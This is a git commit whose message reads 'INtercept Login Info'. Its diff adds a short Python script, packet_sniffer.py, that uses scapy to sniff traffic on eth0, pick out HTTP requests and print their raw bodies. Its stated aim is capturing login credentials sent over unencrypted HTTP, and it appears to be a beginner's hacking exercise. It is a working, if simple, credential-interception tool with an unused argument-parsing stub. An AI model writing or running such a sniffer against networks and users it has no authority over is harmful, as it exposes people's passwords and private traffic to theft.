df8171d02487a1e51ebdf4656d3d0a5a44d33284
0x1tsjusthicham <hicham.ezzamzami@gmail.com>
2024-09-25 19:22:38 -0400

    INtercept Login Info

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,1 +1,17 @@
 import optparse
+import scapy.all as scapy
+from scapy.layers import http
+
+
+def get_arguments():
+    pass
+
+def sniff(interface):
+    scapy.sniff(iface = interface, store = False, prn = process_packet)
+
+def process_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            print(packet[scapy.Raw].load)
+
+sniff("eth0")
